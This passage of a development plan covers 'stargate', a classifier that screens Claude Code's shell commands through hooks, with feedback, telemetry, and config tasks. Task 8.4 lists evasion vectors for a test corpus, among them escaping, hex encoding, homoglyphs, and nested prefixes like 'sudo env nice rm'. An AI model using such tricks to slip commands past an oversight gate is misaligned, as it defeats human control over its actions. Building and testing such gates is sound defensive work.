Test: valid feedback with correct HMAC token → recorded. Invalid HMAC → rejected. Expired trace → `trace_expired`. Duplicate feedback → idempotent (single corpus entry). Test that trace info expires after TTL and `/feedback` returns `trace_expired`.

- [ ] **Step 2: Integrate corpus into classifier**

After YELLOW+LLM rule match: compute signature → lookup precedents → inject into prompt → after LLM verdict, write judgment to corpus (with scrubbed command).

- [ ] **Step 3: Implement feedback handler**

`POST /feedback` — validate HMAC token, look up trace, record `user_approved` in corpus. In-memory `tool_use_id → traceInfo` map with 5-minute TTL and 30-second sweep.

- [ ] **Step 4: Run tests, commit**

```bash
git add internal/feedback/ internal/classifier/ internal/server/
git commit -m "feat(corpus): wire precedent corpus into classifier and add /feedback endpoint"
```

### Task 5.6: `stargate corpus` CLI subcommands

**Files:**
- Modify: `cmd/stargate/main.go`

- [ ] **Step 1: Implement corpus CLI**

Wire `stargate corpus stats`, `search`, `inspect`, `invalidate`, `clear`, `export`, `import`. Each emits audit log at WARN level.

- [ ] **Step 2: Write tests for corpus CLI**

Create table-driven tests covering: `stats` returns expected fields, `search` with a known signature returns results, `inspect` by ID returns details, `invalidate` marks entry invalid, `clear --confirm` removes all entries, `clear` without `--confirm` exits with error, `export` produces valid JSON, `import` loads exported data. Test audit logging for admin operations (`invalidate`, `clear`).

- [ ] **Step 3: Run tests**

```bash
go test ./cmd/stargate/ -v -run TestCorpusCLI
```

- [ ] **Step 4: Commit**

```bash
git add cmd/
git commit -m "feat(corpus): add corpus CLI subcommands (stats, search, invalidate, etc.)"
```

---

## M6: Agent Adapters + Feedback

Goal: Claude Code adapter with pre-tool-use and post-tool-use event handling.

### Task 6.1: Adapter interface and Claude Code pre-tool-use

**Files:**
- Create: `internal/adapter/adapter.go`
- Create: `internal/adapter/claudecode.go`
- Create: `internal/adapter/claudecode_test.go`

- [ ] **Step 1: Write failing tests**

Test: parse Claude Code PreToolUse stdin → extract command, cwd, session_id, tool_use_id. Non-Bash tool_name → allow immediately. Map ClassifyResponse action to permissionDecision. HMAC feedback token persisted to secure temp file.

- [ ] **Step 2: Implement adapter**

`internal/adapter/adapter.go`: `type Adapter interface { HandlePreToolUse(stdin io.Reader, stdout io.Writer) error; HandlePostToolUse(stdin io.Reader) error }`.

`internal/adapter/claudecode.go`: Parse stdin JSON, extract fields, build ClassifyRequest, POST to stargate server, translate response to Claude Code hook output. Store `{stargate_trace_id, feedback_token}` to `$XDG_RUNTIME_DIR/stargate/<tool_use_id>.json` (0700 dir, 0600 file, O_NOFOLLOW).

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/adapter/
git commit -m "feat(adapter): add Claude Code pre-tool-use adapter"
```

### Task 6.2: Claude Code post-tool-use + hook CLI wiring

**Files:**
- Modify: `internal/adapter/claudecode.go`
- Modify: `internal/adapter/claudecode_test.go`
- Modify: `cmd/stargate/main.go`

- [ ] **Step 1: Write failing tests for post-tool-use**

Test: reads tool_use_id from PostToolUse stdin, loads trace file, sends POST /feedback with HMAC token, cleans up temp file. Missing trace file → silent exit 0. Fire-and-forget semantics.

- [ ] **Step 2: Implement post-tool-use and wire CLI**

Wire `stargate hook --agent claude-code --event pre-tool-use` and `stargate hook --agent claude-code --event post-tool-use` in the CLI. Add orphan cleanup (files > 5 min old).

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/adapter/ cmd/
git commit -m "feat(adapter): add Claude Code post-tool-use adapter and hook CLI"
```

---

## M7: Telemetry

Goal: OTel SDK init, structured logs, metrics, traces, Grafana Cloud export.

### Task 7.1: OTel SDK initialization

**Files:**
- Create: `internal/telemetry/telemetry.go`
- Create: `internal/telemetry/telemetry_test.go`

- [ ] **Step 1: Implement OTel init and shutdown**

`Init(cfg config.TelemetryConfig) (*Telemetry, error)` — create OTLP/HTTP exporters for logs, metrics, traces. Configure batch processors, sampling, auth. `Shutdown(ctx context.Context) error` — flush and close all providers.

When `telemetry.enabled = false`, return a no-op `Telemetry` struct where all methods are no-ops.

- [ ] **Step 2: Test with disabled telemetry (no-op path), commit**

```bash
git add internal/telemetry/
git commit -m "feat(telemetry): add OTel SDK initialization with OTLP/HTTP exporters"
```

### Task 7.2: Structured logging, metrics, and traces

**Files:**
- Create: `internal/telemetry/logger.go`
- Create: `internal/telemetry/metrics.go`
- Create: `internal/telemetry/tracer.go`

- [ ] **Step 1: Implement logger, metrics, tracer**

`logger.go`: `LogClassification(result ClassifyResult)` — emit structured OTel log record with all attributes from spec §9.2.

`metrics.go`: Register all counters, histograms, and gauges from spec §9.3. `RecordClassification(...)`, `RecordLLMCall(...)`, `RecordFeedback(...)`.

`tracer.go`: `StartClassifySpan(ctx context.Context) (context.Context, trace.Span)`. Generate `stargate_trace_id`. Create span tree per spec §9.4.

- [ ] **Step 2: Wire telemetry into classifier, server, and feedback**

Add span creation and metric recording at each pipeline stage.

- [ ] **Step 3: Commit**

```bash
git add internal/telemetry/
git commit -m "feat(telemetry): add structured logging, metrics, and trace spans"
```

---

## M8: Hardening

Goal: Config hot-reload, graceful shutdown, /test endpoint, evasion corpus.

### Task 8.1: Config hot-reload via SIGHUP

**Files:**
- Modify: `cmd/stargate/main.go`
- Modify: `internal/server/server.go`

- [ ] **Step 1: Implement SIGHUP handler**

On SIGHUP: load new config, validate, compile rules, atomically swap `atomic.Pointer[Config]`. Log success/failure. Emit `stargate.config_reloads_total` metric.

- [ ] **Step 2: Wire POST /reload to same logic**

- [ ] **Step 3: Test, commit**

```bash
git add cmd/ internal/server/
git commit -m "feat(server): add config hot-reload via SIGHUP and POST /reload"
```

### Task 8.2: POST /test endpoint

**Files:**
- Modify: `internal/server/server.go`

- [ ] **Step 1: Implement /test as dry-run alias for /classify**

Same request/response schema. Always populates `ast.commands` regardless of telemetry settings. Does not write to the precedent corpus.

- [ ] **Step 2: Write tests for /test endpoint**

Verify `/test` returns the same JSON schema as `/classify`. Verify `ast.commands` is always populated regardless of config settings. Verify it does not write to the precedent corpus (query corpus before and after, assert no new entries).

- [ ] **Step 3: Run tests**

```bash
go test ./internal/server/ -v -run TestTestEndpoint
```

- [ ] **Step 4: Commit**

```bash
git add internal/server/
git commit -m "feat(server): add POST /test dry-run endpoint"
```

### Task 8.3: `stargate test` CLI subcommand

**Files:**
- Modify: `cmd/stargate/main.go`

- [ ] **Step 1: Implement `stargate test` subcommand**

Accepts a command string as argument, POSTs to `/test` (or classifies directly if no server running), prints human-readable output (default) or full JSON (`--json`). Supports `--cwd` and stdin (`-`).

- [ ] **Step 2: Test, commit**

```bash
git add cmd/
git commit -m "feat: add stargate test CLI subcommand"
```

### Task 8.4: Evasion test corpus expansion

**Files:**
- Modify: `testdata/evasion_commands.txt`
- Modify: `internal/classifier/corpus_test.go`

- [ ] **Step 1: Expand evasion corpus**

Add all vectors from spec §10.1: backslash escaping, quoting, command/env prefix, brace expansion, hex/octal escaping, variable indirection, command substitution, nested prefixes (sudo env nice rm), unicode homoglyphs. Verify each is caught.

- [ ] **Step 2: Run corpus tests, fix gaps, commit**

```bash
git add testdata/ internal/classifier/
git commit -m "test: expand evasion test corpus with all §10.1 vectors"
```

---

## M9: Distribution

Goal: Makefile, cross-compilation, README, example config, install script, LICENSE.

### Task 9.1: Makefile and cross-compilation

**Files:**
- Create: `Makefile`

- [ ] **Step 1: Create Makefile**

Targets: `build` (local), `build-all` (cross-compile linux/darwin × amd64/arm64), `test`, `lint` (go vet), `clean`. Use `CGO_ENABLED=0` for static binaries. Version injected via `-ldflags`.

- [ ] **Step 2: Test all targets, commit**

```bash
git add Makefile
git commit -m "chore: add Makefile with cross-compilation targets"
```

### Task 9.2: README and LICENSE

**Files:**
- Create: `README.md`
- Create: `LICENSE`

- [ ] **Step 1: Create README**

Quick start, installation, Claude Code hook configuration example, `stargate.toml` reference, CLI usage. Keep it concise.

- [ ] **Step 2: Create LICENSE**

Apache-2.0 license file.

- [ ] **Step 3: Commit**

```bash
git add README.md LICENSE
git commit -m "docs: add README and Apache-2.0 LICENSE"
```

### Task 9.3: `stargate config dump` and `stargate config rules`

**Files:**
- Modify: `cmd/stargate/main.go`

- [ ] **Step 1: Implement remaining config subcommands**

`config dump` — print resolved config as TOML. `config rules` — print rule summary table. `config scopes` — print scope values.

- [ ] **Step 2: Test, commit**

```bash
git add cmd/
git commit -m "feat(config): add config dump, rules, and scopes subcommands"
```
